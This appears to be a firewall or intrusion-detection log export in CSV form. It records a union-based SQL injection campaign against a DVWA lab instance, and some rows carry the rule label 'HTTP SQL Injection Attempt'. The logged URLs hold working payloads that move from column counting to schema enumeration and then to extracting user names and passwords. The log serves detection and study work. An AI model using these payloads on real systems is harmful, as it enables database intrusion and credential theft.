ID_regla,sessionid,repeatcnt,severity_number,Nombre_regla,thread_category,prot,src_ip,dst_ip,log_subtype,extra_data
9999,413855,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'&Submit=Submit
9999,413634,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+order+by+3#&Submit=Submit
9999,413771,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+order+by+3+#&Submit=Submit
9999,415250,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+order+by+3+#&Submit=Submit
14984,413855,8,1,Suspicious HTTP Evasion Found,spyware,tcp,18.218.115.60,172.31.69.28,spyware,18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'&Submit=Submit
33338,413634,7,3,HTTP SQL Injection Attempt,sql-injection,tcp,18.218.115.60,172.31.69.28,vulnerability,18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+order+by+3#&Submit=Submit
35823,413634,7,3,HTTP SQL Injection Attempt,sql-injection,tcp,18.218.115.60,172.31.69.28,vulnerability,18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+order+by+3#&Submit=Submit
9999,414458,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+order+by+2+#&Submit=Submit
9999,413672,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=ID:+3+'+and+1=1+union+select+null,user()&Submit=Submit"
9999,414445,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=0+order+by+2+#&Submit=Submit
9999,317459,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+order+by+2+#&Submit=Submit
30514,414813,6,3,HTTP SQL Injection Attempt,sql-injection,tcp,18.218.115.60,172.31.69.28,vulnerability,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+union+select+1,2+#&Submit=Submit"
58005,414813,6,2,HTTP SQL Injection Attempt,sql-injection,tcp,18.218.115.60,172.31.69.28,vulnerability,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+union+select+1,2+#&Submit=Submit"
14984,303869,6,1,Suspicious HTTP Evasion Found,spyware,tcp,18.218.115.60,172.31.69.28,spyware,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+union+select+1,version()+#&Submit=Submit"
33338,303869,7,3,HTTP SQL Injection Attempt,sql-injection,tcp,18.218.115.60,172.31.69.28,vulnerability,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+union+select+1,version()+#&Submit=Submit"
9999,414813,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+union+select+1,2+#&Submit=Submit"
35823,303869,7,3,HTTP SQL Injection Attempt,sql-injection,tcp,18.218.115.60,172.31.69.28,vulnerability,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+union+select+1,version()+#&Submit=Submit"
9999,303961,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+union+select+null,+table_name+from+information_schema.tables&Submit=Submit"
9999,303869,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+union+select+1,version()+#&Submit=Submit"
9999,413672,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=ID:+3+'+and+1=1+union+select+null,user()+#&Submit=Submit"
9999,413838,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=ID:+ID:+3+'+and+1=1+union+select+null,database()+#&Submit=Submit"
9999,414166,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/
30514,303961,4,3,HTTP SQL Injection Attempt,sql-injection,tcp,18.218.115.60,172.31.69.28,vulnerability,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+union+select+null,+table_name+from+information_schema.tables&Submit=Submit"
58005,303961,4,2,HTTP SQL Injection Attempt,sql-injection,tcp,18.218.115.60,172.31.69.28,vulnerability,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+union+select+null,+table_name+from+information_schema.tables&Submit=Submit"
9999,415170,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+union+select+null,database()+#&Submit=Submit"
9999,414166,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/login.php
9999,413924,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/login.php
9999,413747,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+union+select+null,+table_name+from+information_schema.tables+#&Submit=Submit"
14984,415007,6,1,Suspicious HTTP Evasion Found,spyware,tcp,18.218.115.60,172.31.69.28,spyware,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+union+select+null,+table_name+from+information_schema.columns+where+table_name='users'+#&Submit=Submit"
33338,415007,2,3,HTTP SQL Injection Attempt,sql-injection,tcp,18.218.115.60,172.31.69.28,vulnerability,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+union+select+null,+table_name+from+information_schema.columns+where+table_name='users'+#&Submit=Submit"
35823,415007,2,3,HTTP SQL Injection Attempt,sql-injection,tcp,18.218.115.60,172.31.69.28,vulnerability,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+union+select+null,+table_name+from+information_schema.columns+where+table_name='users'+#&Submit=Submit"
9999,415007,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+union+select+null,+table_name+from+information_schema.columns+where+table_name='users'+#&Submit=Submit"
9999,414794,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=0+union+select+null,+concat(first_name,0x0a,password)+from+users+#&Submit=Submit"
9999,310596,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/index.php
9999,414038,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/security.php
9999,414096,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/sqli/?id='&Submit=Submit
9999,414682,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+order+by+3+#&Submit=Submit
9999,413909,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+order+by+3+#&Submit=Submit
14984,414452,6,1,Suspicious HTTP Evasion Found,spyware,tcp,18.218.115.60,172.31.69.28,spyware,18.218.83.150/DVWA/vulnerabilities/sqli/
9999,414452,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/sqli/
9999,414858,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/sqli/?id='+#&Submit=Submit
33338,414682,7,3,HTTP SQL Injection Attempt,sql-injection,tcp,18.218.115.60,172.31.69.28,vulnerability,18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+order+by+3+#&Submit=Submit
35823,414682,7,3,HTTP SQL Injection Attempt,sql-injection,tcp,18.218.115.60,172.31.69.28,vulnerability,18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+order+by+3+#&Submit=Submit
9999,414059,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+union+select+null,use1r()+#&Submit=Submit"
9999,413909,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+order+by+2+#&Submit=Submit
30514,414778,6,3,HTTP SQL Injection Attempt,sql-injection,tcp,18.218.115.60,172.31.69.28,vulnerability,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+union+select+1,2+#&Submit=Submit"
58005,414778,6,2,HTTP SQL Injection Attempt,sql-injection,tcp,18.218.115.60,172.31.69.28,vulnerability,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+union+select+1,2+#&Submit=Submit"
9999,414778,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+union+select+1,2+#&Submit=Submit"
14984,414330,6,1,Suspicious HTTP Evasion Found,spyware,tcp,18.218.115.60,172.31.69.28,spyware,"18.218.83.150/DVWA/vulnerabilities/sqli/?id=3+'+and+1=1+union+select+1,version()+#&Submit=Submit"
